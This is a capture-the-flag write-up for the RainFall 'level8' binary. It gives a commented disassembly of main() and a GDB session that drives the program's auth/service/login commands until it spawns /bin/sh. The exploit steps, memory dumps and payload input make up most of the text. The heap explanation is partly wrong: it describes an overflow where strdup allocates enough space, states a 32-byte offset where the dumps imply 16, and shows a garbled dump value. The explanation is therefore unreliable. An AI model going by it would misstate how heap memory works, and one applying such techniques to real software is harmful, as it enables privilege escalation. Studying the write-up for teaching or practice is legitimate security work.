# **Level8 - ASM Analysis (GDB only)**

## **Prerequisites for Exploitation**

Before performing any kind of exploitation, we assess the security mitigations in place for this binary.

### **1. Address Space Layout Randomization (ASLR)**

Check if ASLR is enabled:

```bash
level8@RainFall:~$ cat /proc/sys/kernel/randomize_va_space
0
```

A value of 0 means ASLR is disabled, memory addresses will remain consistent across executions, which simplifies our analysis.

### **2. Stack Protections**

Check protections with checksec:

```bash
level8@RainFall:~$ checksec --file ./level8
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level8
```

**Interpretation:**

* No RELRO: no protection for GOT.
* No Canary: we can overwrite the stack freely.
* NX disabled: stack is executable, though unused here.
* No PIE: binary loads at a fixed address.

### **Conclusion**

The binary includes no modern protections. It is a perfect candidate for classic exploitation techniques. In this level, we will exploit a heap-based memory layout flaw by overflowing a chunk into another, modifying a specific byte to trigger a logic condition that gives us a shell via `system("/bin/sh")`.

---

## **Disassembly Analysis**

This section provides a detailed analysis of the disassembled `main` function using GDB. We identify the control flow and observe how user input manipulates memory, ultimately triggering the vulnerability.

### **Function Discovery**

We begin by listing all defined functions in the binary:

```gdb
(gdb) info functions
0x08048564  main
```

Only one user-defined function is present: `main`. This is where the vulnerability lives.

### **Disassembly of main()**

#### **Function Prologue**

```asm
0x08048564 <+0>:     push   %ebp        ; save base pointer
0x08048565 <+1>:     mov    %esp,%ebp   ; create new stack frame
0x08048567 <+3>:     push   %edi        ; save callee-saved register
0x08048568 <+4>:     push   %esi        ; save callee-saved register
0x08048569 <+5>:     and    $0xfffffff0,%esp ; align stack to 16 bytes
0x0804856c <+8>:     sub    $0xa0,%esp  ; reserve 160 bytes of stack space
```

* Standard stack frame setup
* Alignment of ESP
* Reserve 160 bytes of space (likely for local buffers)

---

#### **Initial Loop Start, Print Auth and Service Addresses**

```asm
0x08048572 <+14>:    jmp    0x8048575 <main+17> ; jump to start of loop
```

* Jump to the main loop body.

```asm
0x08048574 <+16>:    nop                        ; no-op / padding
```

* No operation (padding).

```asm
0x08048575 <+17>:    mov    0x8049ab0,%ecx      ; load service ptr
0x0804857b <+23>:    mov    0x8049aac,%edx      ; load auth ptr
0x08048581 <+29>:    mov    $0x8048810,%eax     ; load address of format string "%p, %p\n"
0x08048586 <+34>:    mov    %ecx,0x8(%esp)      ; 3rd printf arg = service
0x0804858a <+38>:    mov    %edx,0x4(%esp)      ; 2nd printf arg = auth
0x0804858e <+42>:    mov    %eax,(%esp)         ; 1st printf arg = format string
0x08048591 <+45>:    call   0x8048410 <printf@plt> ; call printf
```

* `auth` is stored at address `0x8049aac`, `service` at `0x8049ab0`.
* This block prints the addresses of both global pointers with the format string `%p, %p\n`.

---

#### **Read Input via fgets**

```asm
0x08048596 <+50>:    mov    0x8049a80,%eax      ; load stdin
0x0804859b <+55>:    mov    %eax,0x8(%esp)      ; 3rd arg: stdin
0x0804859f <+59>:    movl   $0x80,0x4(%esp)     ; 2nd arg: 128 bytes
0x080485a7 <+67>:    lea    0x20(%esp),%eax     ; buffer at esp+0x20
0x080485ab <+71>:    mov    %eax,(%esp)         ; 1st arg: buffer
0x080485ae <+74>:    call   0x8048440 <fgets@plt> ; read line into buffer

```

* Load `stdin` into eax.
* `fgets(buf, 0x80, stdin)` reads up to 128 bytes into buffer at `esp + 0x20`.

---

#### **Check for End of Input**

```asm
0x080485b3 <+79>:    test   %eax,%eax           ; check if fgets() returned NULL
0x080485b5 <+81>:    je     0x804872c <main+456> ; if NULL, exit main
```

* If `fgets` returns `NULL`, input has ended → jump to function exit.

---

#### **Check If Input == "auth"**

```asm
0x080485bb <+87>:    lea    0x20(%esp),%eax     ; eax = input buffer
0x080485bf <+91>:    mov    %eax,%edx           ; edx = input buffer
0x080485c1 <+93>:    mov    $0x8048819,%eax     ; eax = "auth" string
0x080485c6 <+98>:    mov    $0x5,%ecx           ; compare 5 bytes
0x080485cb <+103>:   mov    %edx,%esi           ; esi = input
0x080485cd <+105>:   mov    %eax,%edi           ; edi = "auth"
0x080485cf <+107>:   repz cmpsb %es:(%edi),%ds:(%esi) ; compare "auth" with input
0x080485d1 <+109>:   seta   %dl                 ; set dl if input > "auth"
0x080485d4 <+112>:   setb   %al                 ; set al if input < "auth"
0x080485d7 <+115>:   mov    %edx,%ecx           ; ecx = dl
0x080485d9 <+117>:   sub    %al,%cl             ; ecx = dl - al
0x080485db <+119>:   mov    %ecx,%eax           ; eax = result
0x080485dd <+121>:   movsbl %al,%eax            ; sign-extend to 32 bits
0x080485e0 <+124>:   test   %eax,%eax           ; if not zero, strings differ
0x080485e2 <+126>:   jne    0x8048642 <main+222> ; jump if not "auth"
```

* Compares the beginning of the input buffer to `"auth"`.
* If not equal, jump to next comparison block (`"reset"`).

---

#### **Allocate and Initialize auth**

```asm
0x080485e4 <+128>:   movl   $0x4,(%esp)         ; malloc(4)
0x080485eb <+135>:   call   0x8048470 <malloc@plt> ; allocate 4 bytes
0x080485f0 <+140>:   mov    %eax,0x8049aac      ; store pointer in auth
```

* Allocate 4 bytes for `auth`.
* Store the result in the global `auth` pointer.

```asm
0x080485f5 <+145>:   mov    0x8049aac,%eax      ; eax = auth
0x080485fa <+150>:   movl   $0x0,(%eax)         ; set *auth = 0
```

* Zero out `auth[0]`.

---

#### **Check if Auth Payload is ≤ 30 chars**

```asm
0x08048600 <+156>:   lea    0x20(%esp),%eax     ; eax = input buffer
0x08048604 <+160>:   add    $0x5,%eax           ; eax = input + 5
0x08048607 <+163>:   movl   $0xffffffff,0x1c(%esp) ; counter = -1
0x0804860f <+171>:   mov    %eax,%edx           ; edx = pointer to string
0x08048611 <+173>:   mov    $0x0,%eax           ; search for null byte
0x08048616 <+178>:   mov    0x1c(%esp),%ecx     ; ecx = max length
0x0804861a <+182>:   mov    %edx,%edi           ; edi = start of string
0x0804861c <+184>:   repnz scas %es:(%edi),%al  ; scan for null byte
0x0804861e <+186>:   mov    %ecx,%eax           ; eax = remaining count
0x08048620 <+188>:   not    %eax                ; invert bits
0x08048622 <+190>:   sub    $0x1,%eax           ; length = ~ecx - 1
0x08048625 <+193>:   cmp    $0x1e,%eax          ; compare with 30
0x08048628 <+196>:  ja     0x8048642 <main+222> ; if > 30, skip copy
```

* Calculates length of input after `"auth "` (starting at buffer+5).
* If length > 30, skip the copy.

---

#### **Copy Auth Payload**

```asm
0x0804862a <+198>:   lea    0x20(%esp),%eax     ; eax = input buffer
0x0804862e <+202>:   lea    0x5(%eax),%edx      ; edx = input + 5
0x08048631 <+205>:   mov    0x8049aac,%eax      ; eax = auth
0x08048636 <+210>:   mov    %edx,0x4(%esp)      ; 2nd arg = source
0x0804863a <+214>:   mov    %eax,(%esp)         ; 1st arg = destination
0x0804863d <+217>:   call   0x8048460 <strcpy@plt> ; strcpy(auth, input+5)
```

* If input length is OK, perform `strcpy(auth, input + 5)`.

---

#### **Check if Input == "reset"**

```asm
0x08048642 <+222>:   lea    0x20(%esp),%eax     ; eax = input buffer
0x08048646 <+226>:   mov    %eax,%edx           ; edx = input buffer
0x08048648 <+228>:   mov    $0x804881f,%eax     ; eax = "reset"
0x0804864d <+233>:   mov    $0x5,%ecx           ; compare 5 bytes
0x08048652 <+238>:   mov    %edx,%esi           ; esi = input
0x08048654 <+240>:   mov    %eax,%edi           ; edi = "reset"
0x08048656 <+242>:   repz cmpsb %es:(%edi),%ds:(%esi) ; compare "reset" with input
0x08048658 <+244>:   seta   %dl                 ; dl = input > "reset"
0x0804865b <+247>:   setb   %al                 ; al = input < "reset"
0x0804865e <+250>:   mov    %edx,%ecx           ; ecx = dl
0x08048660 <+252>:   sub    %al,%cl             ; ecx = dl - al
0x08048662 <+254>:   mov    %ecx,%eax           ; eax = result
0x08048664 <+256>:   movsbl %al,%eax            ; sign-extend result
0x08048667 <+259>:   test   %eax,%eax           ; if not zero → not equal
0x08048669 <+261>:   jne    0x8048678 <main+276> ; jump to next command
```

* Compare input to `"reset"`.
* If not equal, continue to next command check.

---

#### **Free auth if "reset" is matched**

```asm
0x0804866b <+263>:   mov    0x8049aac,%eax      ; eax = auth
0x08048670 <+268>:   mov    %eax,(%esp)         ; set arg to free(auth)
0x08048673 <+271>:   call   0x8048420 <free@plt> ; free(auth)
```

* Frees the memory previously allocated for `auth`.

---

#### **Check if Input == "service"**

```asm
0x08048678 <+276>:   lea    0x20(%esp),%eax     ; eax = address of input buffer
0x0804867c <+280>:   mov    %eax,%edx           ; edx = input buffer
0x0804867e <+282>:   mov    $0x8048825,%eax     ; eax = address of "service"
0x08048683 <+287>:   mov    $0x6,%ecx           ; ecx = length to compare (6 bytes)
0x08048688 <+292>:   mov    %edx,%esi           ; esi = input
0x0804868a <+294>:   mov    %eax,%edi           ; edi = "service"
0x0804868c <+296>:   repz cmpsb %es:(%edi),%ds:(%esi) ; compare 6 bytes of input and "service"
0x0804868e <+298>:   seta   %dl                 ; dl = 1 if input > "service"
0x08048691 <+301>:   setb   %al                 ; al = 1 if input < "service"
0x08048694 <+304>:   mov    %edx,%ecx           ; ecx = dl
0x08048696 <+306>:   sub    %al,%cl             ; cl = dl - al → 0 if input == "service"
0x08048698 <+308>:   mov    %ecx,%eax           ; eax = result
0x0804869a <+310>:   movsbl %al,%eax            ; sign extend result into eax
0x0804869d <+313>:   test   %eax,%eax           ; test if result is 0 (equal)
0x0804869f <+315>:   jne    0x80486b5 <main+337> ; jump if input != "service"
```

* Compares input with `"service"`.
* If not equal, jump to next command check.

---

#### **Copy Service Payload**

```asm
0x080486a1 <+317>:   lea    0x20(%esp),%eax     ; eax = address of input buffer
0x080486a5 <+321>:   add    $0x7,%eax           ; eax += 7 → skip "service " prefix
0x080486a8 <+324>:   mov    %eax,(%esp)         ; push argument to strdup(input + 7)
0x080486ab <+327>:   call   0x8048430 <strdup@plt> ; strdup(input + 7)
0x080486b0 <+332>:   mov    %eax,0x8049ab0      ; service = strdup result
```

* Input after `"service "` (starting at buffer + 7) is duplicated and stored into the global `service` pointer.
* If the content is too long (overflowing the chunk), it may corrupt adjacent heap structures, this is where the vulnerability lives.

---

#### **Check if Input == "login"**

```asm
0x080486b5 <+337>:   lea    0x20(%esp),%eax           ; eax = input buffer
0x080486b9 <+341>:   mov    %eax,%edx                 ; edx = input
0x080486bb <+343>:   mov    $0x804882d,%eax           ; eax = address of "login"
0x080486c0 <+348>:   mov    $0x5,%ecx                 ; ecx = 5 characters to compare
0x080486c5 <+353>:   mov    %edx,%esi                 ; esi = input string
0x080486c7 <+355>:   mov    %eax,%edi                 ; edi = "login"
0x080486c9 <+357>:   repz cmpsb %es:(%edi),%ds:(%esi) ; compare 5 bytes of input with "login"
0x080486cb <+359>:   seta   %dl                       ; set dl = 1 if input > "login"
0x080486ce <+362>:   setb   %al                       ; set al = 1 if input < "login"
0x080486d1 <+365>:   mov    %edx,%ecx                 ; ecx = dl
0x080486d3 <+367>:   sub    %al,%cl                   ; ecx = dl - al
0x080486d5 <+369>:   mov    %ecx,%eax                 ; eax = result of comparison
0x080486d7 <+371>:   movsbl %al,%eax                  ; sign-extend al to eax
0x080486da <+374>:   test   %eax,%eax                 ; set flags based on eax
0x080486dc <+376>:   jne    0x8048574 <main+16>       ; jump to loop start if input != "login"
```

* Compares the input to `"login"`.
* If not equal, loop back to start.

---

#### \**Check (auth + 0x20) == 0*

```asm
0x080486e2 <+382>:   mov    0x8049aac,%eax            ; eax = auth
0x080486e7 <+387>:   mov    0x20(%eax),%eax           ; eax = *(auth + 0x20)
0x080486ea <+390>:   test   %eax,%eax                 ; set flags based on eax
0x080486ec <+392>:   je     0x80486ff <main+411>      ; if zero, jump to print "Password:"
```

* Dereferences `auth + 0x20`.
* If value is zero → show `"Password:\n"`.

---

#### **If not null, spawn shell**

```asm
0x080486ee <+394>:   movl   $0x8048833,(%esp)         ; "/bin/sh" string address into stack
0x080486f5 <+401>:   call   0x8048480 <system@plt>    ; call system("/bin/sh")
0x080486fa <+406>:   jmp    0x8048574 <main+16>       ; jump to top of loop
```

* Calls `system("/bin/sh")` if the value at `auth + 0x20` is non-zero.
* Then loops again.

---

#### **Print "Password:\n"**

```asm
0x080486ff <+411>:   mov    0x8049aa0,%eax            ; eax = stdout
0x08048704 <+416>:   mov    %eax,%edx                 ; edx = stdout
0x08048706 <+418>:   mov    $0x804883b,%eax           ; eax = "Password:\n"
0x0804870b <+423>:   mov    %edx,0xc(%esp)            ; arg3 = stdout
0x0804870f <+427>:   movl   $0xa,0x8(%esp)            ; arg2 = 10 bytes
0x08048717 <+435>:   movl   $0x1,0x4(%esp)            ; arg1 = 1 element
0x0804871f <+443>:   mov    %eax,(%esp)               ; arg0 = "Password:\n"
0x08048722 <+446>:   call   0x8048450 <fwrite@plt>    ; fwrite("Password:\n", 1, 10, stdout)
0x08048727 <+451>:   jmp    0x8048574 <main+16>       ; loop again
```

* Print `"Password:\n"` if the value at `auth + 0x20` is zero.

---

#### **Function Exit**

```asm
0x0804872c <+456>:   nop                              ; no-op (padding)
0x0804872d <+457>:   mov    $0x0,%eax                 ; return value = 0
0x08048732 <+462>:   lea    -0x8(%ebp),%esp           ; restore ESP (clean stack space)
0x08048735 <+465>:   pop    %esi                      ; restore esi
0x08048736 <+466>:   pop    %edi                      ; restore edi
0x08048737 <+467>:   pop    %ebp                      ; restore base pointer
0x08048738 <+468>:   ret                              ; return from main
```

* Normal function epilogue and return.

---

## **Conclusion**

The `main()` function accepts commands that dynamically allocate and copy data into heap objects `auth` and `service`. It is vulnerable to a heap-based overflow when a large string is passed to the `service` command. This overflow allows overwriting the adjacent `auth` chunk, in particular the value at offset `auth + 0x20`. If this value is non-zero, the `login` command will trigger a call to `system("/bin/sh")`. By carefully crafting input that overflows `service` into `auth`, we can bypass the check and gain a shell, effectively exploiting the binary.

## **GDB Runtime Analysis**

This section documents the dynamic analysis of the `level8` binary using GDB. The objective is to understand the heap layout, confirm the overflow primitive, and exploit it to spawn a shell.

---

### **Step 1: Confirm the Only Function is `main`**

We verify that the only user-defined function is `main()`:

```gdb
(gdb) info functions
0x08048564  main
```

Unlike previous levels, there is no hidden function like `m()`. Shell is spawned directly via `system("/bin/sh")` when a condition on the heap is met.

---

### **Step 2: Discover auth and service Addresses**

Start the binary, insert a breakpoint after the `printf` that prints both pointers:

```gdb
(gdb) break *0x08048596 ; => 0x08048596 <+50>:    mov    0x8049a80,%eax
(gdb) run
```

Observe:

```gdb
(gdb) x/x 0x8049aac ; 0x0804857b <+23>:    mov    0x8049aac,%edx
0x8049aac <auth>:  0x00000000
(gdb) x/x 0x8049ab0 ; 0x08048575 <+17>:    mov    0x8049ab0,%ecx
0x8049ab0 <service>:  0x00000000
```

Initially, both `auth` and `service` point to `NULL`.

---

### **Step 3: Allocate and Set a Known Value**

We want to trigger the `"auth"` command and give it some value. Set a breakpoint after the `strcpy(auth, input + 5)` call:

```gdb
(gdb) break *0x08048642 ; => 0x08048642 <+222>:   lea    0x20(%esp),%eax
(gdb) run
```

Then, in the program:

```gdb
auth test
```

We hit the breakpoint.

Now inspect the pointer and content of `auth`:

```gdb
(gdb) x/wx 0x8049aac
0x8049aac <auth>: 0x0804a008

(gdb) x/4wx 0x0804a008
0x804a008: 0x74736574 0x0000000a 0x00000000 0x00020ff1
```

**Explanation:**

* `auth` points to `0x804a008`
* `auth[0] = 0x74736574` → `"tset"` in little endian (i.e. `"test"` input)
* `auth[1] = 0x0000000a` → newline `\\n`
* Remaining values are residual and not relevant to the exploit

---

### Step 4: Trigger the Vulnerability via `service`

Set a breakpoint after the `strdup(input + 7)` call (i.e., right after storing the pointer in `service`):

```gdb
(gdb) break *0x080486b5 ; => 0x080486b5 <+337>:   lea    0x20(%esp),%eax
(gdb) run
```

Now enter the command:

```gdb
auth test
continue
service AAAAAAAA
```

At the breakpoint, we inspect both `auth` and `service`:

```gdb
(gdb) x/wx 0x8049ab0
0x8049ab0 <service>: 0x0804a018

(gdb) x/8wx 0x0804a008
0x804a008: 0x74736574  0x0000000a  0x00000000  0x00000011
0x804a018: 0x41414120  0x41414141  0x00000a41  0x00020fe1
```

**Interpretation:**

* `auth` was allocated at `0x0804a008` and contains the string `"test"` (`0x74736574`)
* `service` is allocated immediately after, at `0x0804a018`
* The 8 `"A"` characters are visible at the start of the `service` chunk

This confirms that the heap layout places the `service` buffer **right after** the `auth` buffer.
At this point, no corruption has occurred, but the layout is fragile.

**Next step:** we’ll increase the length of the `service` input to reach and overwrite memory inside the `auth` chunk, particularly the byte at offset `+0x20`.

---

### **Step 5: Overflow the Chunk**

The goal here is to **reach and overwrite the memory at **, which is the value checked during the `"login"` command:

```
if (*(auth + 0x20) != 0)
  system("/bin/sh");
```

From our previous memory inspections, we know:

* `auth` is allocated at `0x0804a008`
* `service` is allocated immediately after, at `0x0804a018`
* So `auth + 0x20` is at `0x0804a028`

This means we need to write **32 bytes** into the `service` buffer to reach `auth + 0x20`.

To confirm this, we’ll input exactly **32 characters**, that’s why we use:

```
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

> Note: In GDB’s interactive run, we can’t use `$(python -c '...')` because the input goes through the program’s standard input, not the shell. We must type the payload manually.

---

Set a breakpoint after the `strdup()` storing into the `service` pointer:

```gdb
(gdb) break *0x080486b5
(gdb) run
```

When prompted by the program:

```gdb
auth test
continue
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Once we hit the breakpoint, we inspect the heap:

```gdb
(gdb) x/12wx 0x0804a008
0x804a008: 0x7436574  0x0000000a  0x00000000  0x00000029
0x804a018: 0x41414120  0x41414141  0x41414141  0x41414141
0x804a028: 0x41414141  0x41414141  0x41414141  0x41414141
```

The overflow worked, the chunk starting at `service` now extends beyond its original size, reaching `auth + 0x20`.

To confirm the offset numerically:

```gdb
(gdb) print 0x0804a028 - 0x0804a008
$1 = 32
```

We are now ready to place a **non-zero value at `*(auth + 0x20)`** and satisfy the login condition.

---

### **Step 6: Satisfy the Condition and Trigger the Shell**

We now verify that our overflow correctly modified `*(auth + 0x20)` and that the condition to call `system("/bin/sh")` is met.

Set a breakpoint right after the condition:

```gdb
(gdb) break *0x080486e7
```

Resume execution:

```gdb
(gdb) continue
```

When prompted again:

```gdb
0x804a008, 0x804a018
login
```

Type `login` in the program to trigger the vulnerable branch.

We then hit the breakpoint:

```gdb
Breakpoint 2, 0x080486e7 in main ()
```

Inspect the value of `auth + 0x20`:

```gdb
(gdb) x/x 0x0804a028
0x804a028: 0x41414141
```

This confirms that the value at `auth + 0x20` is non-zero, due to the overflow. The condition:

```gdb
if (*(auth + 0x20) != 0)
```

...is therefore true.

Continue execution:

```gdb
(gdb) continue
```

A shell is spawned:

```gdb
$ whoami
level8
```

Warning:  Since we are still inside GDB and the exploit was launched from the `level8` user context, the `whoami` output remains `level8`. However, this proves that the vulnerability can be triggered successfully and leads to `system("/bin/sh")`.

---

### **Conclusion**

This GDB session confirms that `level8` is vulnerable to a heap overflow between two adjacent chunks (`auth` and `service`). Because `strdup()` places the `service` buffer immediately after `auth`, overflowing the service input allows us to write into `auth + 0x20`. This value is later dereferenced and checked, if non-zero, the program executes `system("/bin/sh")`.

**Key Findings:**

* `auth` points to a 4-byte allocation → `auth + 0x20` lives inside the next chunk
* `service` buffer is allocated immediately after `auth`
* **Overflow offset: 32 bytes**
* Injecting a non-zero dword at offset +32 triggers the call to `system("/bin/sh")`
